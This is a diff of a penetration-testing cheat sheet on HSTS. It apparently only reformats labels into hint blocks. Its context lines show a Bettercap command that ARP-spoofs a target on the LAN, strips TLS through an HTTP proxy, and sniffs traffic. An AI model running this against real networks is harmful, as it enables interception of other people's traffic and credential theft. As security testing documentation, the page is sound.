@@ -2,7 +2,7 @@
 
 ## Check List
 
-* [ ] _Review the HSTS header and its validity._
+* [ ] Review the HSTS header and its validity.
 
 ## Cheat Sheet
 
@@ -38,13 +38,17 @@ testssl $WEBSITE
 
 #### [Bettercap](https://www.bettercap.org/)
 
-_Interface Network_
+{% hint style="info" %}
+Interface Network
+{% endhint %}
 
 ```bash
 INTERFACE=$(ip -o -4 addr show | awk '{print $2}' | grep -v "lo" | head -n 1)
 ```
 
-_MitM on LAN_
+{% hint style="info" %}
+MitM on LAN
+{% endhint %}
 
 ```bash
 bettercap -iface $INTERFACE -eval "set arp.spoof.targets $TARGET; arp.spoof on; http.proxy on; http.proxy.sslstrip true; net.sniff on"
